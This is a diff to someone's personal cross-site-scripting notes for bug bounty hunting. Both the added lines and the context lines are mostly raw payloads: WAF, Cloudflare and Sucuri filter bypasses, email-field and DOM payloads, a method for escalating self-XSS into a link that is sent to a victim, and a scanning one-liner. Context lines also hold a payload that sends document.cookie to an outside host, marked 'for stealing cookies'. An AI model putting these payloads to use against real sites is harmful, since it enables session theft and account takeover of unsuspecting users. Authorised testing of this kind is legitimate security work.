@@ -17,6 +17,12 @@ grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | g
    cat urls.txt | dalfox pipe -f payloads.txt           remember, that the payload.txt is the list of your xss payload in a file
    
    
+   
+   ALWAYS REMEMBER TO CHANGE ALERT TO PROMPT 
+   
+  CHECK FOR   BURP SUITE'S DOM INVADER 
+   
+   
    **Tips***  FOR XSS FIREWALL BYOASS
    Check if the firewall is blocking only lowercase
    examples:     <scRipT>alert(1)</scRipT>
@@ -49,6 +55,11 @@ grep '=' output.txt | grep '&' > filtered_urls.txt     or  grep '=' urls.txt | g
      input on text boxes A<h1>A.
      document.location='https://ł.rip/save.php?c='+document.cookie;    this for stealing cookies
      
+     
+     fastest way to find xss
+     
+ inject  this  "><script>alert(document.cookie)</script>      into every parameter on every page of the applicetion,  if the attack string appears unmodifiedin the response , that indicates an xss vulnerabilty
+     
     
    
 2)
@@ -77,14 +88,89 @@ Try every reflected parameter
 
 
 STORED XSS  ARE MOSTLY FOUND MANUALLY
-
-
 Enumerate the Firewall using above Methods and select a payload to test accordingly.
 Try that selected WAF bypass payload while registering on a site in fields like username, name, address, email, etc.
 Try Payload in File name of profile picture and also in the source file of image.
 Try in Comment section anywhere on target site.
 Try on every input fields which get reflected in page and which can be seen by other users.
 Try to signup using your name + xss payload and that can lead to stored xss.
+
+
+
+ANOTHER TIPS
+Open the Contact Support endpoint (https://example.com/contact?submitted=false)
+Inject the XSS payload in any field and Submit the form
+You will be redirected to the Thank you Page at (https://example.com/contact?submitted=true )
+Open the Contact Support endpoint again at (https://example.com/contact?submitted=false)
+You will find the XSS alert :)
+    shorter way
+Open the contact support endpoint (https://example.com/contact?submitted=false)
+Inject the XSS payload in any field BUT enter anything wrong or leave any required field missing in the form and then Submit the form.
+You will find the XSS alert :)
+
+
+another TIP 
+Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
+log in to your previously created account while intercepting the login request, and remove the XSS payload from the firstName parameter of the second request.
+Go to the created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
+You will receive a confirmation email on attacker@gmail.cominforming you that your email has been changed.
+Open the confirmation email and click on View web version to access the vulnerable XSS URL.
+Copy that vulnerable XSS URL and send it to the victim.
+
+
+chatgpt explanation
+
+Inject XSS Payload:
+
+Injected an XSS payload into the "First Name" field during account sign-up.
+Encounter Access Issue:
+
+Encountered a "403 Forbidden" error when attempting to log in.
+Analyze Login Requests:
+
+Used Burp Suite to intercept login requests and discovered two POST requests.
+Identify the Problem:
+
+Suspected the XSS payload in the "firstName" parameter of the second request was causing the issue.
+Resolve Self-XSS:
+
+Removed the XSS payload from the second request, successfully logged in, and noticed a Self-XSS alert.
+Exploit the Vulnerability:
+
+Explored account settings and found the ability to change the email address.
+Email Confirmation:
+
+Changed the email address to another owned address and received a confirmation email at the original email.
+Trigger XSS via Email:
+
+Clicked "View web version" in the email, triggering the XSS alert.
+Share the Vulnerability:
+
+Obtained a URL that triggered the XSS alert and could be shared with others.
+
+
+
+my explaination
+create a account and first login in clearly on the first request
+on the second request, Create an account with an XSS payload in the First Name field using an email that you own, (e.g.: attacker@gmail.com)
+log in to your previously first  created account while intercepting the login request,    remove the XSS payload from the firstName parameter of the second request.
+Go to the  second created Account Settings and change the email to another email that you also own (e.g.: attacker+1@gmail.com)
+Open the confirmation email and click on View web version to access the vulnerable XSS URL.
+
+
+
+///////////
+Bug Bounty Tip
+
+HTML entities can help you bypass WAF filters
+
+1) bypass block of single quote '
+?url=home%26apos;-alert(1)//
+onclick="location='/home&apos;-alert(1)//'"
+
+2) bypass block of colon :
+?url=javascript%26colon;alert(1)
+href="javascript&colon;alert(1)"
 
 analysis 
 ************TIP******
@@ -105,15 +191,15 @@ jaVasCript:/*-/*`/*`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</t
       
       
       
+
  CLOUDFLARE BYPASS [XSS]
-
 PAYLOAD:
-<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))> 
+ - <img src=x on0x=1 onerror=alert(document.cookie)>
 
-     Email 
 
-“><svg/onload=confirm(1)>”@gmail.com     
-  "><svg/onload=confirm(1)>"@x.y 
+
+
 
 
 🌐ColdFusion  XSS
@@ -131,9 +217,24 @@ javascript:alert(1)
     
     Sucuri bypass payload 
 <s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
+
+some browers tolearate extra bracket
+  <<script>alert(10);//<</scripts>
+
+using invalid tags
+<x onclick=alert(1) src=a>click here </x>
+
+
+beating the lenght limit  example
+  https://mypaa.com/account.php?page_id="><script>/*&seed=*/alert(document.cookie);/*&mode=*</script>
   
 
-  If you have a parameter call 'email'
+ 
+       Email 
+
+“><svg/onload=confirm(1)>”@gmail.com     
+  "><svg/onload=confirm(1)>"@x.y 
+  test+(<script>alert(document.domain)</script>)@gmail.com
 just try this payload:
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
   
@@ -177,12 +278,39 @@ Use burpcollaborator or ngrok
 9- Chat Applications
 10- Any app that requires user moderation
 
-DOM XSS
+            DOM XSS
 Tips
 Would not recommend manually looking for DOM XSS
 Burp suite PRO scanner can find DOM XSS
 Tool: https://github.com/dpnishant/ra2-dom-xss-scanner
 
+www.gap.com/email?message=<script>alert("hi")</script>
+
+     
+     Tips to find DOM XSS: ⚡️🔥
+
+1. Start Burpsuite Community Edition 
+2. Click on Open Browser 
+3. Go and click on the Burp icon in extension tab on browser 
+4. Click on Turn on DOM Invader 
+5. Inject a custom canary 
+6. Open target website, right click, Inspect and go to Invader
+7. Now Click on Inject URL or Inject Form
+8. Check Reflection of canary
+9. If all goes well, You will see the green exploit button
+10. Click it to get Dom XSS poc 
+11. If doesn’t work, repeat the same on different url, functionality. 
+
+///
+eval(alert(document.domain))
+location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
+location.search
+
+window.location.hash.slice(1)
+
+<iframe src="www.google.com" onload="this src+='<img src=1 onerror=alert(1)"'>
+ 
+     
 
 
     idea (someone) for finding xss
@@ -237,6 +365,32 @@ xhr.send();
 ($$ \unicode{<img src=1 onerror=alert(1)>} $$) 
 
 
+
+
+
+Pay careful attention to where your injection takes place. 
+For example, a clothing store may have a filter to show only shirts in the color blue. Added to the URL could be something along the lines of /?s=color_blue.
+
+Often times the first instinct is to inject by replacing everything after the =. Try replacing only the portion reflected on that page or the parameter you're looking to filter. Example /?s=color_<script>alert()</script>.
+
+Another injection point may be entering the payload after the filter like the example in these images. Example /?s=color_blue<script>alert()</script>
+
+
+   lesser known payload   /replace video with music, or image
+<video onerror="alert(1)">
+
+
+This payload puts a twist on requiring user interaction. By injecting a style tag, we manipulate the size of the HTML tag to be the size of the screen. Any mouse movement on the page will pop the alert.
+   1"%20onmouseover="alert(document.domain)"%20style="position%3Aabsolute;%20top%3A0;%
+
+
+
+        /?search=<IMG%20SRC=1%20onmouseover=alert()>                         USING CASE SENSETIVE
+
+
+
+
+
   WEAPONING XSS
   
 NOTE: WHEN having a simple XSS in alert form But when we attempted to demonstrate its impact or leverage it beyond an alert we have nothing! Thankfully, if you find yourself in this situation, you can write a compact XSS stager with 98 characters using the following JavaScript syntax (note, you could save a few more characters by registering a shorter domain name and using an index page):   
@@ -266,15 +420,4 @@ To compensate for this, you can attach an event listener to the document which w
     Find the parameters which are not filtering special characters - One Liner
      echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
 cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
-
-
-
-
-
-    
-
-
-
-
-
 
